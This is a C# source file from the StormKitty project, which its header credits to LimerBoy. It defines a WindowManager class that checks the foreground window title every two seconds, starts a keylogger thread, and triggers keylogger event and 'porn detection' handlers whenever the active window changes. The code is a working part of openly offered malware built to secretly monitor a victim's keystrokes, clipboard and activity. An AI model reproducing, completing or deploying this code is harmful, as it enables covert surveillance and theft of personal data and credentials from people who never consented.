/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/StormKitty
*/

using System;
using System.Threading;
using System.Diagnostics;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace StormKitty
{
    internal sealed class WindowManager
    {
        public static string ActiveWindow;
        public static Thread MainThread = new Thread(Run);

        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll", SetLastError = true)]
        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        // Get active window
        private static string GetActiveWindowTitle()
        {
            try
            {
                IntPtr hwnd = GetForegroundWindow();
                GetWindowThreadProcessId(hwnd, out uint pid);
                Process proc = Process.GetProcessById((int)pid);
                string title = proc.MainWindowTitle;
                if (string.IsNullOrWhiteSpace(title))
                    title = proc.ProcessName;
                return title;
            }
            catch (Exception)
            {
                return "Unknown";
            }
        }

        // List with functions to call when active window is changed
        private static List<Action> functions = new List<Action>()
        {
            Keylogger.EventManager.Action,
            Keylogger.PornDetection.Action
        };
        // Run title checker
        private static void Run()
        {
            Keylogger.Keylogger.MainThread.Start();
            string PrevActiveWindow = "";
            while (true)
            {
                Thread.Sleep(2000);
                ActiveWindow = GetActiveWindowTitle();
                if (ActiveWindow != PrevActiveWindow)
                {
                    PrevActiveWindow = ActiveWindow;
                    ClipboardManager.PrevClipboard = "";
                    foreach (Action f in functions)
                        f.Invoke();
                }
            }
        }

    }
}
